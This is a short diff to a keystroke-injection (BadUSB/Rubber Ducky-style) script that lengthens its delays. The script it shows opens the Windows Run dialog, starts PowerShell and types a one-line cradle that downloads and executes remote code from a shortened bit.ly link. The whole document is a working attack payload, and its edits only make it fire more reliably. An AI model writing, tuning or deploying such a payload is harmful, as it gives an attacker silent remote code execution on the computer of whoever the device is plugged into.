@@ -1,8 +1,8 @@
 DELAY 1000
 GUI r
-DELAY 150
+DELAY 200
 STRING powershell
 ENTER
-DELAY 2000
+DELAY 3250
 STRING IEX(New-Object Net.WebClient).DownloadString('http://bit.ly/3xI7L')
 ENTER
